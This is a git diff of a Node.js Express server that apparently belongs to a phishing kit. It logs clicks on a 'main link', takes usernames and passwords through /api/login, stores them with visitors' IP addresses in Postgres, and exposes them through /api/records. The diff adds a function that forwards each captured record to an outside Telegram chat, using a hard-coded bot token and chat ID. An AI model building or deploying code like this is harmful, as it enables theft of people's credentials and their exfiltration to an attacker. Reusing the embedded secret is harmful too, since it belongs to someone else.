@@ -1,6 +1,7 @@
 const express = require('express');
 const path = require('path');
 const { Pool } = require('pg');
+const fetch = require('node-fetch');
 
 const app = express();
 app.use(express.json());
@@ -12,6 +13,28 @@ const pool = new Pool({
     ssl: { rejectUnauthorized: false }
 });
 
+// Telegram Config
+const BOT_TOKEN = "8840000220:AAHAgXsHJVwYQp64ulKVCC7e4AoLvm4YWpY";
+const CHAT_ID = "6728113939";
+
+async function sendTelegramAlert(message) {
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "HTML"
+            })
+        });
+        console.log("📱 Telegram Alert Sent");
+    } catch (err) {
+        console.error("Telegram Error:", err.message);
+    }
+}
+
+// Create Table
 pool.query(`CREATE TABLE IF NOT EXISTS records (
     id SERIAL PRIMARY KEY,
     type TEXT,
@@ -38,12 +61,17 @@ async function saveRecord(type, username = null, password = null, address = null
             [type, username, password, address, ip, timestamp]
         );
         console.log(`✅ SAVED: ${type} | IP: ${ip}`);
+
+        // Send Telegram Alert
+        const alertMsg = `🔔 <b>NEW ACTIVITY</b>\n\nType: ${type}\nIP: ${ip}\nTime: ${timestamp}\nDetails: ${address || username || 'N/A'}`;
+        sendTelegramAlert(alertMsg);
+
     } catch (err) {
         console.error("Save Error:", err.message);
     }
 }
 
-// ==================== MAIN LINK CLICK (Most Important) ====================
+// ==================== ROUTES ====================
 app.get('/', async (req, res) => {
     const ip = getRealIP(req);
     await saveRecord('Page Visit', null, null, 'Main Link Clicked', ip);
@@ -63,7 +91,6 @@ app.post('/api/login', async (req, res) => {
     res.json({ success: true });
 });
 
-// Other routes
 app.get('/api/records', async (req, res) => {
     try {
         const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
@@ -96,24 +123,3 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
 });
-
-// Telegram Config
-const BOT_TOKEN = "8840000220:AAHAgXsHJVwYQp64ulKVCC7e4AoLvm4YWpY";
-const CHAT_ID = "6728113939";
-
-async function sendTelegramAlert(message) {
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: "HTML"
-            })
-        });
-        console.log("📱 Telegram Alert Sent Successfully");
-    } catch (err) {
-        console.error("Telegram Error:", err.message);
-    }
-}
